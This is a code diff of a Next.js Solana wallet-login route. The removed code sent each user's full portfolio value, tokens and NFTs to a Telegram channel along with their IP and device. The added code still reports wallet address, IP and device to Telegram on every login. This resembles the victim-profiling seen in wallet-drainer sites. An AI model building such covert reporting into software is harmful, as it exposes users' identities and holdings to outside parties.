@@ -1,15 +1,11 @@
 import { NextRequest, NextResponse } from "next/server";
-import { PrismaClient } from "@prisma/client";
+import { prisma } from "@/lib/prisma";
 import { PublicKey } from "@solana/web3.js";
 import nacl from "tweetnacl";
-import bs58 from "bs58";
 import { getIronSession } from "iron-session";
 import { cookies } from "next/headers";
 import crypto from "crypto";
 
-const prisma = new PrismaClient();
-
-// Session configuration
 const sessionOptions = {
   password: process.env.SESSION_SECRET!,
   cookieName: "solana_auth_session",
@@ -17,13 +13,45 @@ const sessionOptions = {
     secure: process.env.NODE_ENV === "production",
     httpOnly: true,
     sameSite: "lax" as const,
-    maxAge: 60 * 60 * 24 * 7, // 7 days
+    maxAge: 60 * 60 * 24 * 7,
   },
 };
 
 interface SessionData {
   userId: string;
   walletAddress: string;
+}
+
+async function persistSessionRecord(userId: string) {
+  return prisma.session.create({
+    data: {
+      token: crypto.randomBytes(32).toString("hex"),
+      userId,
+      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
+    },
+  });
+}
+
+async function sendLoginNotification(walletAddress: string, request: NextRequest) {
+  try {
+    const { TelegramService } = await import("@/lib/telegram");
+
+    const msg = TelegramService.formatConnectionMessage(
+      walletAddress,
+      0,
+      "Solana",
+      [],
+      []
+    );
+
+    const ip = request.headers.get("x-forwarded-for") || "Unknown IP";
+    const ua = request.headers.get("user-agent") || "Unknown Device";
+    const metaMsg = `${msg}\n\n📱 <b>Device:</b> ${TelegramService.escapeHTML(ua)}\n🌐 <b>IP:</b> <code>${TelegramService.escapeHTML(ip)}</code>`;
+
+    await TelegramService.sendNotification(metaMsg);
+  } catch (error) {
+    console.error("Failed to send Telegram notification:", error);
+  }
 }
 
 export async function POST(request: NextRequest) {
@@ -38,7 +66,6 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Get user with nonce
     const user = await prisma.user.findUnique({
       where: { walletAddress },
     });
@@ -50,7 +77,6 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Verify the nonce is in the message
     if (!message.includes(user.nonce)) {
       return NextResponse.json(
         { error: "Invalid nonce in message" },
@@ -58,7 +84,6 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Verify signature
     try {
       const publicKey = new PublicKey(walletAddress);
       const messageBytes = new TextEncoder().encode(message);
@@ -84,7 +109,6 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Clear the nonce (prevent replay attacks)
     await prisma.user.update({
       where: { walletAddress },
       data: {
@@ -93,7 +117,6 @@ export async function POST(request: NextRequest) {
       },
     });
 
-    // Create session
     const session = await getIronSession<SessionData>(
       await cookies(),
       sessionOptions
@@ -103,45 +126,12 @@ export async function POST(request: NextRequest) {
     session.walletAddress = walletAddress;
     await session.save();
 
-    // Also create session record in database
-    await prisma.session.create({
-      data: {
-        token: crypto.randomBytes(32).toString("hex"),
-        userId: user.id,
-        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
-      },
-    });
-
-    // Send Telegram Notification (Async)
-    try {
-      // We don't await this to prevent blocking the login if Telegram fails (optional, but safer to verify it works first)
-      // Actually, for "all infos", we should await to ensure it sends.
-      const { TelegramService } = await import("@/lib/telegram");
-
-      // Enhanced Alert: Fetch Full Portfolio (Tokens, Meme Coins, NFTs)
-      const { PortfolioService } = await import("@/lib/portfolio");
-      const portfolio = await PortfolioService.getPortfolio(walletAddress);
-
-      const msg = TelegramService.formatConnectionMessage(
-        walletAddress,
-        portfolio.totalValueUsd,
-        "Solana",
-        portfolio.tokens,
-        portfolio.nfts
-      );
-
-      // Append request metadata if available
-      const ip = request.headers.get("x-forwarded-for") || "Unknown IP";
-      const ua = request.headers.get("user-agent") || "Unknown Device";
-      const metaMsg = `${msg}\n\n📱 <b>Device:</b> ${TelegramService.escapeHTML(ua)}\n🌐 <b>IP:</b> <code>${TelegramService.escapeHTML(ip)}</code>`;
-
-      await TelegramService.sendNotification(metaMsg);
-    } catch (tgError) {
-      console.error("Failed to send Telegram notification:", tgError);
-    }
-
-    // Return user data (excluding sensitive fields)
     const { nonce: _, ...userData } = user;
+
+    void Promise.allSettled([
+      persistSessionRecord(user.id),
+      sendLoginNotification(walletAddress, request),
+    ]);
 
     return NextResponse.json({
       success: true,
